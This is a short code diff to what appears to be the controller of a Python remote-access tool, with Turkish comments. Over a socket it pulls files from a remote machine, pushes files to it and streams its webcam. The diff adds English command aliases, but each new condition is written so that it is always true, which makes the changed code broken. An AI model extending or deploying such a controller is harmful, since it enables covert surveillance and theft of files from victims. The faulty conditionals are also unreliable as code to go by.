@@ -42,7 +42,7 @@ while True:
         break # komut exit ise döngüyü sonlandırıyoruz.
 
     # Dosya indirme
-    if command.lower() == "indir":
+    if command.lower() == "indir" or "download":
         dosya_ismi = input("Dosyanın adını girin: ")
         client_socket.send(dosya_ismi.encode()) # istediğimiz dosyanın adını karşıya gönderdik.
         
@@ -66,7 +66,7 @@ while True:
         continue
 
     # Dosya gönderme
-    if command.lower() == "gonder":
+    if command.lower() == "gonder" or "upload":
         dosya_ismi = input("Dosyanın lokasyonunu/adını girin: ")
 
         client_socket.send(dosya_ismi.encode()) # Göndereceğimiz dosyanın isim bilgisini karşı tarafa ilettik
@@ -94,7 +94,7 @@ while True:
         
 
     # Webcam izleme
-    if command.lower() == "webcam_izle":
+    if command.lower() == "webcam_izle" or "webcam_start":
         wdata = b""
         payload_size = struct.calcsize("Q")
         while True:
